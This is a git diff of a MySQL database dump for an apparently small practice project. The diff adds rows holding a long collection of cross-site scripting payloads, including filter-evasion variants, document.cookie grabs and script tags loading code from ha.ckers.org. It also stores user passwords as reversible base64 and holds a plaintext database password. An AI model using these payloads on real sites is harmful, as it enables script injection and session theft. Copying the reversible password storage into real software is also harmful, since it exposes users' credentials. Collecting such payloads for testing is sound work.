@@ -27,6 +27,7 @@ CREATE USER 'has'@'localhost' IDENTIFIED BY 'elwlxjfqhdks!!';
 GRANT ALL PRIVILEGES ON h4s_db.* TO 'has'@'localhost';
 
 USE h4s_db;
+
 DROP TABLE IF EXISTS `tblcontents`;
 /*!40101 SET @saved_cs_client     = @@character_set_client */;
 /*!50503 SET character_set_client = utf8mb4 */;
@@ -42,7 +43,7 @@ CREATE TABLE `tblcontents` (
 
 LOCK TABLES `tblcontents` WRITE;
 /*!40000 ALTER TABLE `tblcontents` DISABLE KEYS */;
-INSERT INTO `tblcontents` VALUES (NULL,'https://xss-game.appspot.com/level1/frame?');
+INSERT INTO `tblcontents` VALUES (NULL,'https://xss-game.appspot.com/level1/frame?'),('<script>alert(123)</script>, <script>alert(\"hellox worldss\");</script>, <script>alert(  XSS  )</script>, <script>alert(  XSS  );</script>, <script>alert(  XSS  )</script>',NULL),(NULL,'https://xss-game.appspot.com/level1/frame'),('<script>alert(123);</script>, <ScRipT>alert(\"XSS\");</ScRipT>, <script>alert(123)</script>, <script>alert(\"hellox worldss\");</script>, <script>alert(\"XSS\")</script>, <script>alert(\"XSS\");</script>, \"><script>alert(\"XSS\")</script>, <script>alert(/XSS\")</script>, <script>alert(/XSS/)</script>, </script><script>alert(1)</script>, <ScRiPt>alert(1)</sCriPt>, <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}, <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?, <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/, http://www.google<script .com>alert(document.location)</script, <script ^__^>alert(String.fromCharCode(49))</script ^__^, </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(, <script ~~~>alert(0%0)</script ~~~>, <script src=\"data:text/javascript,alert(1)\"></script>, http://www.<script>alert(1)</script .com, <svg><script ?>alert(1), <svg contentScriptType=text/vbs><script>MsgBox+1, <script>+-+-1-+-+alert(1)</script>, <script itworksinallbrowsers>/*<script* */alert(1)</script, <svg><script>//&NewLine;confirm(1);</script </svg>, <svg><script onlypossibleinopera:-)> alert(1), <script x> alert(1) </script 1=2, <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>, <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>, <<SCRIPT>alert(\"XSS\");//<</SCRIPT>, \"><s\"%2b\"cript>alert(document.cookie)</script>, foo<script>alert(1)</script>, <scr<script>ipt>alert(1)</scr</script>ipt>, <SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>, <SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>, <<SCRIPT>alert(\"XSS\");//<</SCRIPT>, <script>alert(\"hellox worldss\")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510, <script>alert(\"XSS\");</script>&search=1, <? foo=\"><script>alert(1)</script>\">, <! foo=\"><script>alert(1)</script>\">, </ foo=\"><script>alert(1)</script>\">, <! foo=\"[[[Inception]]\"><x foo=\"]foo><script>alert(1)</script>\">, <% foo><x foo=\"%><script>alert(123)</script>\">, <script>({0:#0=alert/#0#/#0#(0)})</script>, <svg xmlns=\"http://www.w3.org/2000/svg\">LOL<script>alert(123)</script></svg>, &lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;, <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>, <SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>, <SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>, <<SCRIPT>alert(\"XSS\");//<</SCRIPT>, <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>, </TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>, <SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>, <SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>, <? foo=\"><script>alert(1)</script>\">, <! foo=\"><script>alert(1)</script>\">, </ foo=\"><script>alert(1)</script>\">, <script>({0:#0=alert/#0#/#0#(123)})</script>, <script src=\"#\">{alert(1)}</script>;1, <svg xmlns=\"#\"><script>alert(1)</script></svg>, \"><s\"%2b\"cript>alert(document.cookie)</script>, \"><ScRiPt>alert(document.cookie)</script>, \"><<script>alert(document.cookie);//<</script>, foo<script>alert(document.cookie)</script>, <scr<script>ipt>alert(document.cookie)</scr</script>ipt>, </script><script >alert(document.cookie)</script>, <script>alert(1)</script>, \"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>',NULL),(NULL,'https://xss-game.appspot.com/level1/frame'),('<a href=\"data:application/x-x509-user cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a, <a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>, <a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">, <a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>, <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>, <math><a xlink:href=\"//jsfiddle.net/t846h/\">click, <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe, <math><a xlink:href=\"//jsfiddle.net/t846h/\">click, <a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a>',NULL),(NULL,'https://xss-game.appspot.com/level1/frame'),('<video src=1 onerror=alert(1)>',NULL),(NULL,'https://xss-game.appspot.com/level1/frame');
 /*!40000 ALTER TABLE `tblcontents` ENABLE KEYS */;
 UNLOCK TABLES;
 
@@ -122,8 +123,8 @@ DROP TABLE IF EXISTS `tblusers`;
 /*!40101 SET @saved_cs_client     = @@character_set_client */;
 /*!50503 SET character_set_client = utf8mb4 */;
 CREATE TABLE `tblusers` (
-  `users_id` varchar(10) NOT NULL,
-  `users_pw` varchar(30) NOT NULL,
+  `users_id` varchar(500) NOT NULL,
+  `users_pw` varchar(500) NOT NULL,
   PRIMARY KEY (`users_id`)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
 /*!40101 SET character_set_client = @saved_cs_client */;
@@ -134,7 +135,7 @@ CREATE TABLE `tblusers` (
 
 LOCK TABLES `tblusers` WRITE;
 /*!40000 ALTER TABLE `tblusers` DISABLE KEYS */;
-INSERT INTO `tblusers` VALUES ('test','test'),('test2','test2'),('test3','test3');
+INSERT INTO `tblusers` VALUES ('dGVzdDJDNUFERUI3QzcwNkVGRDJEREVBRUQ3QjFEOEFBRkM1NDI0NzQxRTczMUU0NEMzNzNFQjFGQkM4NzIwQUYwQ0Q5NzkyNDlDNzVCRDZCNjFEMDU2QjhERENFRjc5OUU1NjIyNTgxRjczMkExNEI3RTc4QTY1NTA0NUE2QkFCMjUxNw==','dGVzdDJDNUFERUI3QzcwNkVGRDJEREVBRUQ3QjFEOEFBRkM1NDI0NzQxRTczMUU0NEMzNzNFQjFGQkM4NzIwQUYwQ0Q5NzkyNDlDNzVCRDZCNjFEMDU2QjhERENFRjc5OUU1NjIyNTgxRjczMkExNEI3RTc4QTY1NTA0NUE2QkFCMjUxNw=='),('dGVzdEBnbWFpbC5jb21DNUFERUI3QzcwNkVGRDJEREVBRUQ3QjFEOEFBRkM1NDI0NzQxRTczMUU0NEMzNzNFQjFGQkM4NzIwQUYwQ0Q5NzkyNDlDNzVCRDZCNjFEMDU2QjhERENFRjc5OUU1NjIyNTgxRjczMkExNEI3RTc4QTY1NTA0NUE2QkFCMjUxNw==','Z29vZ2xlX1BAc3N3MHJkQzVBREVCN0M3MDZFRkQyRERFQUVEN0IxRDhBQUZDNTQyNDc0MUU3MzFFNDRDMzczRUIxRkJDODcyMEFGMENEOTc5MjQ5Qzc1QkQ2QjYxRDA1NkI4RERDRUY3OTlFNTYyMjU4MUY3MzJBMTRCN0U3OEE2NTUwNDVBNkJBQjI1MTc='),('dGVzdEM1QURFQjdDNzA2RUZEMkRERUFFRDdCMUQ4QUFGQzU0MjQ3NDFFNzMxRTQ0QzM3M0VCMUZCQzg3MjBBRjBDRDk3OTI0OUM3NUJENkI2MUQwNTZCOEREQ0VGNzk5RTU2MjI1ODFGNzMyQTE0QjdFNzhBNjU1MDQ1QTZCQUIyNTE3','dGVzdEM1QURFQjdDNzA2RUZEMkRERUFFRDdCMUQ4QUFGQzU0MjQ3NDFFNzMxRTQ0QzM3M0VCMUZCQzg3MjBBRjBDRDk3OTI0OUM3NUJENkI2MUQwNTZCOEREQ0VGNzk5RTU2MjI1ODFGNzMyQTE0QjdFNzhBNjU1MDQ1QTZCQUIyNTE3'),('dGVzdF9hY2NvdW50QzVBREVCN0M3MDZFRkQyRERFQUVEN0IxRDhBQUZDNTQyNDc0MUU3MzFFNDRDMzczRUIxRkJDODcyMEFGMENEOTc5MjQ5Qzc1QkQ2QjYxRDA1NkI4RERDRUY3OTlFNTYyMjU4MUY3MzJBMTRCN0U3OEE2NTUwNDVBNkJBQjI1MTc=','UEBzc3cwcmRDNUFERUI3QzcwNkVGRDJEREVBRUQ3QjFEOEFBRkM1NDI0NzQxRTczMUU0NEMzNzNFQjFGQkM4NzIwQUYwQ0Q5NzkyNDlDNzVCRDZCNjFEMDU2QjhERENFRjc5OUU1NjIyNTgxRjczMkExNEI3RTc4QTY1NTA0NUE2QkFCMjUxNw==');
 /*!40000 ALTER TABLE `tblusers` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
@@ -147,4 +148,4 @@ UNLOCK TABLES;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2022-11-09 14:50:15
+-- Dump completed on 2022-11-11 16:16:38
